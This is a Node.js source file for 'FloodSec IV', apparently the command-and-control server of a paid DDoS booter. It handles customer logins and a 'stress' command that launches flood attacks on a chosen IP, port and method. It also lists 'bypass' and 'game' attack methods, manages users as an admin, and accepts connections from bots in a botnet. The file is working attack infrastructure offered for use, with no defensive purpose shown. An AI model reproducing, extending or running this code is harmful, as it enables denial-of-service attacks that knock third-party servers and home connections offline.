/*
*@title: FloodSec IV
*@since: 2/28/21
*@creator: n4n0
*/

// Files
const Server = require("./CNC/server/main.js");
const ServerFunc = require("./CNC/server/functions.js");

const Crud = require("./CNC/Auth/crud.js");
const eCrud = require("./CNC/Auth/functions.js");
const Auth = require("./CNC/Auth/main.js");

const Config = require("./CNC/Config/main.js");
const eConfig = require("./CNC/Config/current.js");

const Banners = require("./CNC/banners/main.js");

const Extra = require("./CNC/Extra/main.js");
const eExtra = require("./CNC/Extra/functions.js");


Server.svr.on('connection', async function(socket) {
    if(Config.Login === false) {
        socket.write("The net is currently under maintenance");
        socket.destroy();
    }
    eExtra.set_TerminalSize(30, 80, socket);

    /*
    *                           CONNECTING USER
    */

    /* Getting Connecting User IP/PORT */
    Server.setInfo(socket.remoteAddress.replace("::ffff:", ""), socket.remotePort);

    eExtra.set_Title("FloodSec IV | [API]: 6 | ", socket)

    /* Showing the connecting user on server side terminal! */
    console.log('A new connection has been established\r\nClient IP: ' + Server.Socket_Info.UserIP + ":" + Server.Socket_Info.UserPORT + "\r\n");


    
    //* END


    /*
    *                            LOGIN SECTION
    */

    //Get Username
    socket.write(Banners.login_b());
    eExtra.set_cursor(9, 37, socket);
    eExtra.set_Title("                                                  FloodSec VI | Welcome to bypass land | [APIs]: 6", socket);
    eConfig.CurrentLogin.Username = await ServerFunc.getInput(socket, "");

    socket.write(Config.Colors.Clear);

    //Get Password
    socket.write(Banners.login_v());
    eExtra.set_cursor(9, 37, socket);
    eConfig.CurrentLogin.Password = await ServerFunc.getInput(socket, "");

    /* Get User Input In A Loop */

    socket.write(Config.Colors.Clear);
    let login_resp = Auth.login(eConfig.CurrentLogin.Username, eConfig.CurrentLogin.Password, Server.Socket_Info.UserIP);
    if(login_resp.includes("Successfully")) {
        socket.write(Banners.main_b());
        socket.write("                   Welcome To FloodSec Bypass Land, " + eConfig.CurrentLogin.Username + "\r\n");
        eExtra.log_action("Login Attempt Successfully", eConfig.CurrentLogin.Username, Server.Socket_Info.UserIP + ":" + Server.Socket_Info.UserPORT);
    } else {
        eExtra.log_action("Login Attempt Failed", eConfig.CurrentLogin.Username, Server.Socket_Info.UserIP + ":" + Server.Socket_Info.UserPORT);
        socket.write(Config.Colors.Clear + "Error, Invalid Info!");
        await eExtra.sleep(3000).then(() => {
            socket.destroy();
        })
    }

    //* END

    /*
    *                               GETTING USER INPUT
    */

    /* End Of User Connecting Process */
    socket.write(Config.hostname(eConfig.CurrentLogin.Username))
    socket.on('data', async function(data) {
        socket.setEncoding('utf8');
        Server.setInfo(socket.remoteAddress.replace("::ffff:", ""), socket.remotePort);
        let inputCMD = data.toString().replace(/(\r\n|\n|\r)/gm,"");
        let Current = Crud.GetCurrentUser(Server.Socket_Info.UserIP).split(",");
        eConfig.GetCmd(inputCMD);
        // eConfig.GetUserInfo();

        if(eConfig.CurrentCmd.Cmd === "help" || eConfig.CurrentCmd.Cmd === "?") {
            socket.write(Config.Colors.Clear + Banners.main_b() + Banners.help_list() + Config.hostname(Current[0]));
        } else if(eConfig.CurrentCmd.Cmd === "clear" || eConfig.CurrentCmd.Cmd === "cls") {
            socket.write(Config.Colors.Clear + Banners.main_b() + Config.hostname(Current[0]));
        } else if(eConfig.CurrentCmd.Cmd === "geo") {
            let ip = eConfig.CurrentCmd.arg[1];
            let result = await eExtra.GeoIP(ip)
            socket.write(result + Config.hostname(Current[0]));
        } else if(eConfig.CurrentCmd.Cmd === "scan") {
            let ip = eConfig.CurrentCmd.arg[1];
            let result = await eExtra.GeoIP(ip);
            socket.write(result + Config.hostname(Current[0]));
        } else if(eConfig.CurrentCmd.Cmd === "myinfo") {
            socket.write(eCrud.show_stats(Current[0]) + Config.hostname(Current[0]))
        } else if(eConfig.CurrentCmd.Cmd === "change_pw") {
            socket.write(Crud.changePassword(Current[0], eConfig.CurrentCmd.arg[1]) + Config.hostname(Current[0]));
        } else if(eConfig.CurrentCmd.Cmd === "stress") {
            /*
            *      STRESSER SECTION
            */
            console.log(eConfig.CurrentCmd.arg);
            socket.write(await eExtra.send_attack(eConfig.CurrentCmd.arg[1], eConfig.CurrentCmd.arg[2], eConfig.CurrentCmd.arg[3], eConfig.CurrentCmd.arg[4]) + Config.hostname(Current[0]));
        } else if(eConfig.CurrentCmd.Cmd === "methods") {
            if(eConfig.CurrentCmd.arg[1] == "home") {
                socket.write(Config.Colors.Clear + Banners.main_b() + Banners.Home_HomeM() + Config.hostname(Current[0]));
            } else if(eConfig.CurrentCmd.arg[1] === "game") {
                socket.write(Config.Colors.Clear + Banners.main_b() + Banners.Game_GameM() + Config.hostname(Current[0]));
            } else if(eConfig.CurrentCmd.arg[1] === "bypass") {
                socket.write(Config.Colors.Clear + Banners.main_b() + Banners.Bypass_BypaM() + Config.hostname(Current[0]));
            } else if(eConfig.CurrentCmd.arg[1] === "special") {
                socket.write(Config.Colors.Clear + Banners.main_b() + Banners.Special_SpecM() + Config.hostname(Current[0]));
            } else {
                socket.write(Config.Colors.Clear + Banners.main_b() + Banners.methods() + Config.hostname(Current[0]));
            }
        } else if(eConfig.CurrentCmd.Cmd === "admin") {
            /*
            *       ADMIN SECTION 
            */
            if(eCrud.isAdmin(Current[0]) || eConfig.CurrentUser.isAdmin === true) {
                let tool = eConfig.CurrentCmd.arg[1];
                let arg2 = eConfig.CurrentCmd.arg[2];
                let arg3 = eConfig.CurrentCmd.arg[3];
                let arg4 = eConfig.CurrentCmd.arg[4];
                let arg5 = eConfig.CurrentCmd.arg[5];
                let arg6 = eConfig.CurrentCmd.arg[6];
                let arg7 = eConfig.CurrentCmd.arg[7];
                if(tool === "add") {
                    let resp = Crud.addUser(arg2, arg3, arg4, arg5, arg6);
                    socket.write(resp + Config.hostname(Current[0]));                    
                } else if(tool === "remove") {
                    socket.write(Crud.removeUser(arg2) + Config.hostname(Current[0]));
                } else if(tool === "update") {
                    socket.write(Crud.userUpdate(arg2, arg3, arg4, arg5) + Config.hostname(Current[0]));
                } else if(tool === "change_motd") {
                    let msg = eExtra.CleanMOTD(eConfig.CurrentCmd.arg);
                    socket.write(Crud.change_motd(msg.replace(eConfig.CurrentCmd.arg[0] + " " + eConfig.CurrentCmd.arg[1], ""))+ Config.hostname(Current[0]));
                } else if(tool === "reset_ip") {
                    socket.write(Crud.resetIP(arg2, arg3) + Config.hostname(Current[0]));
                } else if(tool === "change_pw") {
                    socket.write(Crud.changePassword(arg2, arg3) + Config.hostname(Current[0]));
                } else {
                    socket.write(Config.Colors.Clear + Banners.main_b() + Banners.admin_list() + Config.hostname(Current[0]));
                }
            } else {
                socket.write("[x] Error, You aren't admin to use this command!\r\n" + Config.hostname(Current[0]));
            }
        } else {
            socket.write("[x] Error, No command found!\r\n" + Config.hostname(Current[0]));
        }
        
        eExtra.log_action("CMD", Current[0], Server.Socket_Info.UserIP + ":" + Server.Socket_Info.UserPORT);
    })
        

        //* END
        

    socket.on('end', function() {
        Crud.removeSession(Server.Socket_Info.UserIP);
        console.log('Closing connection with the client\r\n');
    });

    socket.on('error', function(err) {
        console.log("[NODEJS SERVER ERROR(IGNORE)]: " + err + "\r\n");
    });
});

/*
*                                   BOT SECTION
*/

Server.bot.on('connection', function(socket) {
    Server.setBotInfo(socket.remoteAddress.replace("::ffff:", ""), socket.remotePort);

    
    console.log('A Bot connection has been established\r\nClient IP: ' + Server.Bot_Socket.BotIP + ":" + Server.Bot_Socket.BotPORT + "\r\n\r\n");

    socket.write("ping");
    socket.on('data', function(data) {
        let inputCMD = data.toString().replace(/(\r\n|\n|\r)/gm,"");
        if(inputCMD === "ping") {
            socket.write("ping");
        } 
    })

    socket.on('end', function() {
        console.log('Bot Left...........\r\n\r\n');
    });

    socket.on('error', function(err) {
        console.log("[NODEJS BOT ERROR(IGNORE)]: " + err + "\r\n\r\n");
    });
});

